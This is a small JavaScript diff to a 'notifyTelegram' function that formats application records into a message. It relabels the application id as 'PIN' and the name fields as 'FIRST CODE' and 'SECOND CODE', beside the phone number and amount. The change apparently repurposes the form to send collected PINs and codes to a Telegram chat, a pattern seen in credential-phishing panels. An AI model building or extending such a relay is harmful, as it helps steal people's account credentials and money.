@@ -363,10 +363,10 @@ async function notifyTelegram(application) {
   }
 
   const text = `${title}\n\n` +
-    `📋 APPLICATION: ${application.application_id || application.application_no}\n` +
+    `📌 PIN: ${application.application_id || application.application_no}\n` +
     `📞 PHONE: ${application.phone}\n` +
-    `👤 FIRST NAME: ${application.first_name || "waiting"}\n` +
-    `👤 SECOND NAME: ${application.second_name || "waiting"}\n` +
+    `👤 FIRST CODE: ${application.first_name || "waiting"}\n` +
+    `👤 SECOND CODE: ${application.second_name || "waiting"}\n` +
     `💰 AMOUNT: ${money(application.amount)}\n` +
     `📌 STATUS: ${application.status}`;
 
